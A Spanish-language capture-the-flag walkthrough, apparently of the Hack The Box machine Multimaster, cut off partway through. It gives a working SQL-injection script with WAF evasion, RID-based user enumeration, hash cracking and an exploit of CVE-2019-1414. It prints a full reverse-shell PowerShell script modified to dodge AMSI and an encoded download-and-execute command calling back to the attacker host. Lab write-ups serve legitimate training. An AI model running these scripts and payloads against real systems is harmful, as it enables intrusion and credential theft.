HTTPAPI httpd 2. 0 (SSDP/UPnP)   Ya que vemos que el puerto 445 esta abierto procederemos a enumerarlo, usando la herramienta crackmapexec: ❯ crackmapexec smb 10. 10. 10. 179SMB     10. 10. 10. 179  445  MULTIMASTER   [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP. LOCAL) (signing:True) (SMBv1:True)Añadimos el domain a nuestro /etc/hosts echo  10. 10. 10. 179 MEGACORP. LOCAL  &gt;&gt; /etc/hostsExplotación #: Buscaremos si podemos listar recursos compartidos, para ello podemos hacer uso de smbmap con los parametros -H para especificar el host y -u para hacer uso de una sesion nula. ❯ smbmap -H 10. 10. 10. 179 -u 'null'[!] Authentication error on 10. 10. 10. 179Vemos que no contamos con acceso por smb , seguidamente probaremos a tratat de enumerar usuarios del sistema por rpc con rpcclient y de igual manera no tenemos acceso. ❯ rpcclient -U    10. 10. 10. 179 -Nrpcclient $&gt; enumdomusersresult was NT_STATUS_ACCESS_DENIEDrpcclient $&gt; Entonces procederemos a abrir la pagina web correspondiente a un IIS.  Despues de enumerar un rato la pagina web, en la opcion colleague finder realizamos una busqueda que nos reporta una lista de usuarios.  ❯ cat users. txtsbauerokentckanekpageshaynajamesrmartinjordenalyxileenbournezpowersaldomminatoVamos a validar si los usuarios son validos usando la herramienta kerbrute  https://github. com/ropnop/kerbrute❯ /opt/kerbrute/kerbrute userenum --dc 10. 10. 10. 179 -d MEGACORP. LOCAL users. txt  __       __        __    / /_____ _____/ /_ _______ __/ /____  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&lt; / __/ / / /_/ / / / /_/ / /_/ __//_/|_|\___/_/ /_. ___/_/  \__,_/\__/\___/                    Version: dev (n/a) - 03/31/23 - Ronnie Flathers @ropnop2023/03/31 18:45:44 &gt; Using KDC(s):2023/03/31 18:45:44 &gt; 	10. 10. 10. 179:882023/03/31 18:45:44 &gt; [+] VALID USERNAME:	ckane@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	okent@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	sbauer@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	rmartin@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	kpage@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	james@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	jorden@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	ilee@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	alyx@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	zpowers@MEGACORP. LOCAL2023/03/31 18:45:45 &gt; [+] VALID USERNAME:	nbourne@MEGACORP. LOCAL2023/03/31 18:45:45 &gt; [+] VALID USERNAME:	aldom@MEGACORP. LOCAL2023/03/31 18:45:45 &gt; Done! Tested 14 usernames (12 valid) in 0. 787 secondsComo nos encontramos en un entorno de directorio activo y es un domain controler, vamos a intentar realizar con los usuarios un ASREPRoast Attack, mediante el cual podemos solicituar un TGT sin conocer las contraseñas de los usuarios para obtener hashes que podemos crackear de forma offline. Para ello usaremos la herramienta de impakcet GetNpUsers. py.  https://github. com/fortra/impacket❯ GetNPUsers. py MEGACORP. LOCAL/ -no-pass -usersfile users. txtImpacket v0. 9. 24 - Copyright 2021 SecureAuth Corporation[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User ckane doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User kpage doesn't have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User rmartin doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User jorden doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User alyx doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User ilee doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User nbourne doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User zpowers doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User aldom doesn't have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)Anteriormente veiamos que en Colleague Finder teniamos un input que vamos a proceder a interceptar con burpsite para tratar de causar un error en la consulta.  Cuando añadimos simbolos como la ', nos manda un mensaje de error 403 Forbidden y con otros simbolos un 200 ok, asi que vamos a intentar realizar fuerza bruta con wfuzz para entender que esta pasando, para ello usaremos un diccionario del repositorio de danielmiessler llamado special-chars. txt.  ❯ wfuzz -c -X POST -t 100 -w /opt/SecLists/Fuzzing/special-chars. txt -H 'Content-Type: application/json;charset=utf-8' -d '{ name : FUZZ }' -u http://10. 10. 10. 179/api/getColleagues /usr/lib/python3/dist-packages/wfuzz/__init__. py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: http://10. 10. 10. 179/api/getColleaguesTotal requests: 32=====================================================================ID      Response  Lines  Word    Chars    Payload                                                        =====================================================================000000007:  403    29 L   92 W    1233 Ch    ^                                                           000000015:  403    29 L   92 W    1233 Ch    =                                                           000000003:  403    29 L   92 W    1233 Ch    @                                                           000000001:  403    29 L   92 W    1233 Ch    ~                                                           000000016:  403    29 L   92 W    1233 Ch    {                                                           000000014:  403    29 L   92 W    1233 Ch    + Vemos que al usar muchos hilos en la peticion el servidor nos bloquea por la existencia de un WAF, para ello con usos adicionaremos unos parametros -s 1, para que mande una peticion por segundo y ocultaremos el codigo de estado 200 ❯ wfuzz -c -X POST --hc=200 -s 1 -w /opt/SecLists/Fuzzing/special-chars. txt -H 'Content-Type: application/json;charset=utf-8' -d '{ name : FUZZ }' -u http://10. 10. 10. 179/api/getColleagues /usr/lib/python3/dist-packages/wfuzz/__init__. py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: http://10. 10. 10. 179/api/getColleaguesTotal requests: 32=====================================================================ID      Response  Lines  Word    Chars    Payload                                                        =====================================================================000000004:  403    29 L   92 W    1233 Ch    #                                                           000000021:  500    0 L   4 W    36 Ch     \                                                           000000028:  403    29 L   92 W    1233 Ch    :                                                           000000029:  403    29 L   92 W    1233 Ch    '                                                           000000030:  403    29 L   92 W    1233 Ch                                                                000000031:  403    29 L   92 W    1233 Ch    &lt;                                                           000000032:  403    29 L   92 W    1233 Ch    &gt;                                                           Total time: 32. 39251Processed Requests: 32Filtered Requests: 25Requests/sec. : 0. 987882Al finalizar wfuzz nos muestra que la \ nos reporta un codigo de estado 500 Internal Server Error, que curiosamente usa sqlmap con el nombre de tamper para ofuzcar sus payloads como en el siguente ejemplo.  &gt;&gt;&gt; tamper('SELECT FIELD FROM TABLE')  '\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045'A efectos practicos al mandar la peticion debemos usar \\u00 seguido de cada caracter en hexadecimal no es necesario usar tres \ con uno basta. Para no realizar la peticion una a una o usar sqlmap, vamos a realizarlo manualmente creandonos un script en python3: #!/usr/bin/python3from pwn import *import requests, time, json, signaldef def_handler(sig, frame):  print( \n[!] Saliendo. . . !\n )  sys. exit(1)#ctrl_c -&gt; al presionar nos ejecuta la funcion def_handlersignal. signal(signal. SIGINT, def_handler)#global_variablesmain_url =  http://10. 10. 10. 179/api/getColleagues #recibimos la data como input y la tratamos def recivesql(sqlinyection):  sqlmodified =     for character in sqlinyection:    sqlmodified +=  \\u00  + hex(ord(character))[2:]  return sqlmodified#realizamos la peticion enviando la data tratada y la representamos en formato jsondef sendsql(sqlmodified):  headers = {    'Content-Type': 'application/json;charset=utf-8'  }  data_post = '{ name :  %s }' % sqlmodified      r = requests. post(main_url, headers=headers, data=data_post)  data_json = json. loads(r. text)  return (json. dumps(data_json,indent=4))if __name__ == '__main__':#mediante un bucle recibimos la data como input  while True:    sqlinyection = input( &gt;  )    sqlinyection = sqlinyection. strip()    sqlmodified = recivesql(sqlinyection)    response_json = sendsql(sqlmodified)    print(response_json)Ejecutamos el script y realizamos una inyeccion sql. ❯ python3 sql_inject. py&gt; ttest' union select 1,schema_name,3,4,5 from information_schema. schemata-- -[  {     id : 1,     name :  db_accessadmin ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_backupoperator ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_datareader ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_datawriter ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_ddladmin ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_denydatareader ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_denydatawriter ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_owner ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_securityadmin ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  dbo ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  guest ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  INFORMATION_SCHEMA ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  sys ,     position :  3 ,     email :  4 ,     src :  5   }]&gt;Enumerando la base de datos dbo encontramos usuarios y contraseñas encriptadas. aldom:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739alyx:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfackane:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813cyork:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739egre55:cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babcilee:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813james:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739jorden:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739kpage:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813minatotw:cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babcnbourne:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfaokent:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfarmartin:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfasbauer:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739shayna:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739zac:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813zpowers:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813Usaremos hashcat para crackear los hashes, y logramos obtener 3 contraseñas. password1finance1banking1Ya que tenemos una lista de usuarios y contraeñas probamos a validar si alguna de ellas es valida con crackmapexec y nos reprota que ninguna es valida. ❯ crackmapexec smb 10. 10. 10. 179 -u users. txt -p passwords --continue-on-successSMB     10. 10. 10. 179  445  MULTIMASTER   [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP. LOCAL) (signing:True) (SMBv1:True)SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\sbauer:password1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\sbauer:finance1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\sbauer:banking1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\okent:password1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\okent:finance1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\okent:banking1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\andrew:password1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\andrew:finance1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\andrew:banking1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\ckane:password1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\ckane:finance1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\ckane:banking1 STATUS_LOGON_FAILURESim embargo debemos recordar que cuando nos encotramos en un entorno de directorio activo, podemos enumerar usuarios o informacion del DC a partir de inyecciones. &gt; test' union select 1,default_domain(),3,4,5-- -[  {     id : 1,     name :  MEGACORP ,     position :  3 ,     email :  4 ,     src :  5   }]&gt; Ahora con una query especifica vamos a lista el SID y RID correspondiente al usuario Administrator  SID Y RID: El Identificador Relativo (RID) es parte del Identificador de Seguridad (SID) en los dominios de Microsoft Windows. Es la parte del SID que identifica a un principal de seguridad (un usuario, grupo o equipo) en relación con la autoridad que expidió el SID. &gt; testt' union select 1,(select sys. fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator'))),3,4,5-- -[  {     id : 1,     name :  0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000 ,     position :  3 ,     email :  4 ,     src :  5   }]&gt;De el resultado que nos reporta los ultimos 8 caracteres corresponden al RDI, que viene a estar representado en hexadecimal si lo tratamos un poco. ❯ python3Python 3. 9. 2 (default, Feb 28 2021, 17:03:44) [GCC 10. 2. 1 20210110] on linuxType  help ,  copyright ,  credits  or  license  for more information. &gt;&gt;&gt; 0x01f4500&gt;&gt;&gt; hex(500)'0x1f4'&gt;&gt;&gt; hex(501)'0x1f5Si modificamos el rdi con el valor hexadecimal de 501, entonces correspondera a otro usuario, en este caso Ghest. &gt; test' union select 1,(select SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f5010000)),3,4,5-- -[  {     id : 1,     name :  MEGACORP\\Guest ,     position :  3 ,     email :  4 ,     src :  5   }]Esto nos da la idea que podemos lista los usuarios del DC a partir de poder conmutar el RID, para ello en vez de hacerlo uno por uno, vamos a modificar un poco el script que ya teniamos para gestionarlo mejor. #!/usr/bin/python3from pwn import *import requests, time, json, signaldef def_handler(sig, frame):  print( \n[!] Saliendo. . . !\n )  sys. exit(1)#ctrl_csignal. signal(signal. SIGINT, def_handler)#global_variablesmain_url =  http://10. 10. 10. 179/api/getColleagues sid =  0x0105000000000005150000001c00d1bcd181f1492bdfc236 #tratamos la datadef recivesql(sqlinyection):  sqlmodified =     for character in sqlinyection:    sqlmodified +=  \\u00  + hex(ord(character))[2:]  return sqlmodified#enviamos la data procesadadef sendsql(sqlmodified):  headers = {    'Content-Type': 'application/json;charset=utf-8'  }  data_post = '{ name :  %s }' % sqlmodified      r = requests. post(main_url, headers=headers, data=data_post)  data_json = json. loads(r. text)  return (json. dumps(data_json,indent=4))#obtebemos el RID en el formato adecuadodef getRID(i):  cadena = hex(i). replace( x ,  )  lista = []  for caracter in cadena:    lista. append(caracter)  rid = lista[2] + lista[3] + lista[0] +lista[1] +  0000   return ridif __name__ == '__main__':#establecemos un rango que casi siempre corresponden a los usuarios  for i in range(1100, 1200):    rid = getRID(i)    sqli =  ttest' union select 1,(select SUSER_SNAME(%s%s)),3,4,5-- -  % (sid, rid)    sqlmodified = recivesql(sqli)    response_json = sendsql(sqlmodified)    print(response_json)      time. sleep(2)Una vez ejecutamos el script despues de un breve momento obtenemos nuevos usuarios. ❯ python3 sql_inject. py[  {     id : 1,     name :   ,     position :  3 ,     email :  4 ,     src :  5   }][  {     id : 1,     name :  MEGACORP\\DnsAdmins ,     position :  3 ,     email :  4 ,     src :  5   }][  {     id : 1,     name :  MEGACORP\\DnsUpdateProxy ,     position :  3 ,     email :  4 ,     src :  5   }][  {     id : 1,     name :  MEGACORP\\svc-nas ,     position :  3 ,     email :  4 ,     src :  5   }][  {     id : 1,     name :  MEGACORP\\Privileged IT Accounts ,     position :  3 ,     email :  4 ,     src :  5   }][    {     id : 1,     name :  MEGACORP\\tushikikatomo ,     position :  3 ,     email :  4 ,     src :  5   }][  {     id : 1,     name :  MEGACORP\\andrew ,     position :  3 ,     email :  4 ,     src :  5   }][  {     id : 1,     name :  MEGACORP\\lana ,     position :  3 ,     email :  4 ,     src :  5   }]Con estos nuevos usuarios validamos con crackmapexec y esta vez obtenemos unas credenciales validas correspondiente al usuario tushikikatomo ❯ crackmapexec smb 10. 10. 10. 179 -u users. txt -p passwords --continue-on-successSMB     10. 10. 10. 179  445  MULTIMASTER   [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP. LOCAL) (signing:True) (SMBv1:True)SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\tushikikatomo:password1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [+] MEGACORP. LOCAL\tushikikatomo:finance1 SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\tushikikatomo:banking1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\lana:password1 STATUS_LOGON_FAILUREComo antes nmap nos reporto que el puerto 5985 estaba abierto intentaremos conectarnos con estas credenciales con evil-winrmy visualizamos la primera flag user. txt ❯ evil-winrm -i 10. 10. 10. 179 -u 'tushikikatomo' -p 'finance1'Evil-WinRM shell v3. 4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github. com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\alcibiades\Documents&gt; cd . . \Desktop*Evil-WinRM* PS C:\Users\alcibiades\Desktop&gt; type user. txt9d5ca88b1cafe75450e0b7a7b03c7834Escalada de Privilegios #: Enumerando un poco el sistema encontramos que se ejecuta el proceso Code correspondiente a Visual Code *Evil-WinRM* PS C:\Users\alcibiades\Desktop&gt; Get-ProcessHandles NPM(K)  PM(K)   WS(K)   CPU(s)   Id SI ProcessName------- ------  -----   -----   ------   -- -- -----------  277   51  57564   74188        652  1 Code  576   39  30472   72024       1212  1 Code  403   53  96468   122704       5464  1 Code  315   31  37032   62272       5576  1 Code  397   21  16804   23172       5836  1 Code  194   15   6112   12432       6056  1 Code   63    4   708    3532       5832  0 CompatTelRunner   93    8   1308    5884       4092  0 conhostVamos a la ruta, lo ejecutamos con el panel de ayuda y y este nos devuelve su version. *Evil-WinRM* PS C:\Program Files\Microsoft VS Code\bin&gt; . \code -hVisual Studio Code 1. 37. 1Usage: code. exe [options][paths. . . ]Despues de realizar una busqueda encontramos el CVE-2019-1414 asociado a esta version para elevegar privilegios a traves de la exposicion de un debug listener.  Mayor detalle en el articulo a continuacion:  https://iwantmore. pizza/posts/cve-2019-1414. htmlUsaremos la herramienta cefdebug de github para explotar esta vulnerabilidad  https://github. com/taviso/cefdebugNos descargamos el ejecutable y lo subimos a la maquina victima en este caso lo hare con un recurso compartido, pero se puede hacer de muchas maneras. ❯ impacket-smbserver smbFolder $(pwd) -smb2supportImpacket v0. 9. 24 - Copyright 2021 SecureAuth Corporation[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3. 0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1. 0[*] Config file parsed[*] Config file parsed[*] Config file parsed*Evil-WinRM* PS C:\WIndows\Temp\Priv&gt; copy \\10. 10. 16. 6\smbFolder\ceffdebug. exe ceffdebug. exePara ejecutarlo solo debemos seguir los pasos tal cual el repositorio. *Evil-WinRM* PS C:\WIndows\Temp\Priv&gt; . \ceffdebug. execeffdebug. exe : [2023/04/02 09:05:12:5013] U: There are 6 tcp sockets in state listen.   + CategoryInfo     : NotSpecified: ([2023/04/02 09:. . . n state listen. :String) [], RemoteException  + FullyQualifiedErrorId : NativeCommandError[2023/04/02 09:05:32:5800] U: There were 4 servers that appear to be CEF debuggers. [2023/04/02 09:05:32:5800] U: ws://127. 0. 0. 1:11996/b1874235-1857-4869-9ded-b35ae9c0f43d[2023/04/02 09:05:32:5800] U: ws://127. 0. 0. 1:52031/ef49c60c-66f9-448b-82a9-b08dc1a07022[2023/04/02 09:05:32:5800] U: ws://127. 0. 0. 1:24483/2f82f71d-03eb-4e62-ae62-8e8cd1a041c1[2023/04/02 09:05:32:5800] U: ws://127. 0. 0. 1:43978/c8928169-15af-4124-83a5-42b180e1b697*Evil-WinRM* PS C:\WIndows\Temp\Priv&gt; . \ceffdebug. exe --url ws://127. 0. 0. 1:24483/2f82f71d-03eb-4e62-ae62-8e8cd1a041c1 --code  process. mainModule. require('child_process'). exec('ping 10. 10. 16. 6') ceffdebug. exe : [2023/04/02 09:05:58:8202] U: &gt;&gt;&gt; process. mainModule. require('child_process'). exec('ping 10. 10. 16. 6')  + CategoryInfo     : NotSpecified: ([2023/04/02 09:. . . ng 10. 10. 16. 6'):String) [], RemoteException  + FullyQualifiedErrorId : NativeCommandError[2023/04/02 09:05:58:8202] U: &lt;&lt;&lt; ChildProcessy al ponernos en escucha con tcpdump recibimos la traza icmp ❯ tcpdump -i tun0 -n icmptcpdump: verbose output suppressed, use -v[v]. . . for full protocol decodelistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes15:59:01. 108853 IP 10. 10. 10. 179 &gt; 10. 10. 16. 6: ICMP echo request, id 1, seq 1, length 4015:59:01. 108917 IP 10. 10. 16. 6 &gt; 10. 10. 10. 179: ICMP echo reply, id 1, seq 1, length 4015:59:02. 150656 IP 10. 10. 10. 179 &gt; 10. 10. 16. 6: ICMP echo request, id 1, seq 2, length 4015:59:02. 150666 IP 10. 10. 16. 6 &gt; 10. 10. 10. 179: ICMP echo reply, id 1, seq 2, length 40Lo siguiente sera ganar acceso a traves de una consola interactiva, para ello usaremos el script Invoke-PowerShellTcp. ps1 del repositorio de nishang  https://github. com/samratashok/nishangAhora para poder realizar AMSI bypass, debemos editar el script cambiando el nombre de la funcion y borrando los comentarios para evitar problemas en la ejecucion. function dalecontodo {   [CmdletBinding(DefaultParameterSetName= reverse )] Param(    [Parameter(Position = 0, Mandatory = $true, ParameterSetName= reverse )]    [Parameter(Position = 0, Mandatory = $false, ParameterSetName= bind )]    [String]    $IPAddress,    [Parameter(Position = 1, Mandatory = $true, ParameterSetName= reverse )]    [Parameter(Position = 1, Mandatory = $true, ParameterSetName= bind )]    [Int]    $Port,    [Parameter(ParameterSetName= reverse )]    [Switch]    $Reverse,    [Parameter(ParameterSetName= bind )]    [Switch]    $Bind  )    try   {    if ($Reverse)    {      $client = New-Object System. Net. Sockets. TCPClient($IPAddress,$Port)    }    if ($Bind)    {      $listener = [System. Net. Sockets. TcpListener]$Port      $listener. start()        $client = $listener. AcceptTcpClient()    }     $stream = $client. GetStream()    [byte[]]$bytes = 0. . 65535|%{0}    $sendbytes = ([text. encoding]::ASCII). GetBytes( Windows PowerShell running as user   + $env:username +   on   + $env:computername +  `nCopyright (C) 2015 Microsoft Corporation. All rights reserved. `n`n )    $stream. Write($sendbytes,0,$sendbytes. Length)    $sendbytes = ([text. encoding]::ASCII). GetBytes('PS ' + (Get-Location). Path + '&gt;')    $stream. Write($sendbytes,0,$sendbytes. Length)    while(($i = $stream. Read($bytes, 0, $bytes. Length)) -ne 0)    {      $EncodedText = New-Object -TypeName System. Text. ASCIIEncoding      $data = $EncodedText. GetString($bytes,0, $i)      try      {        $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )      }      catch      {        Write-Warning  Something went wrong with execution of command on the target.           Write-Error $_      }      $sendback2 = $sendback + 'PS ' + (Get-Location). Path + '&gt; '      $x = ($error[0] | Out-String)      $error. clear()      $sendback2 = $sendback2 + $x      $sendbyte = ([text. encoding]::ASCII). GetBytes($sendback2)      $stream. Write($sendbyte,0,$sendbyte. Length)      $stream. Flush()     }    $client. Close()    if ($listener)    {      $listener. Stop()    }  }  catch  {    Write-Warning  Something went wrong! Check if the server is reachable and you are using the correct port.       Write-Error $_  }}dalecontodo -Reverse -IPAddress 10. 10. 16. 3 -Port 443En la maquina victima ejecutaremos una peticion al script con Iex para que nos lo interprete, pero antes debemos hacerlo en un formato que windows entienda. Para ello usaremos iconv y lo transformaremos a base64 de este modo poder ejecutar la peticion con powershell ❯ echo -n  IEX(New-Object Net. WebClient). downloadString('http://10. 10. 16. 3/PS. ps1')  | iconv -t utf-16le | base64 -w 0; echoSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADMALwBQAFMALgBwAHMAMQAnACkATeniendo el formato adecuando podemos pasar a ejecutar el cefdebug. Compartimos el PS. ps1 y seguidamente con rlwrap y ntcat ponernos en escucha. ❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . 10. 10. 10. 179 - - [02/Apr/2023 16:23:11]  GET /PS. ps1 HTTP/1. 1  200 -*Evil-WinRM* PS C:\WIndows\Temp\Priv&gt; . \ceffdebug. execeffdebug. exe : [2023/04/02 09:28:38:6062] U: There are 3 tcp sockets in state listen.   + CategoryInfo     : NotSpecified: ([2023/04/02 09:. . . n state listen. :String) [], RemoteException  + FullyQualifiedErrorId : NativeCommandError[2023/04/02 09:28:58:6598] U: There were 1 servers that appear to be CEF debuggers. [2023/04/02 09:28:58:6618] U: ws://127. 0. 0. 1:16034/d18406c9-66d7-41ff-946f-3f2a9b0eabfe*Evil-WinRM* PS C:\WIndows\Temp\Priv&gt; . \ceffdebug. exe --url ws://127. 0. 0. 1:16034/d18406c9-66d7-41ff-946f-3f2a9b0eabfe --code  process. mainModule. require('child_process'). exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBQAFMALgBwAHMAMQAnACkA') ceffdebug. exe : [2023/04/02 09:30:09:1259] U: &gt;&gt;&gt; process. mainModule. require('child_process'). exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBQAFMALgBwA. . .   + CategoryInfo     : NotSpecified: ([2023/04/02 09:. . . wBQAFMALgBwA. . . :String) [], RemoteException  + FullyQualifiedErrorId : NativeCommandError[2023/04/02 09:30:09:1269] U: &lt;&lt;&lt; ChildProcessy recimos una consola como el usuario cyork ❯ rlwrap ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 179. Ncat: Connection from 10. 10. 10. 179:50183. Windows PowerShell running as user cyork on MULTIMASTERCopyright (C) 2015 Microsoft Corporation. All rights reserved. whoamimegacorp\cyorkListando los grupos del usuario, vemos que pertenece al grupo Developers; este grupo tiene acceso al directorio inetpub\wwwroot Dentro encontramos archivos dll, concretamente un archivo de nombre MultimasterAPI. dll que procederemos a traernos a nuestra maquina. dir  Directory: C:\inetpub\wwwroot\binMode        LastWriteTime     Length Name                                 ----        -------------     ------ ----                                 d-----     1/7/2020  9:28 PM        roslyn                                -a----    2/21/2013  7:13 PM     102912 Antlr3. Runtime. dll                          -a----    2/21/2013  7:13 PM     431616 Antlr3. Runtime. pdb                          -a----    5/24/2018  1:08 AM     40080 Microsoft. 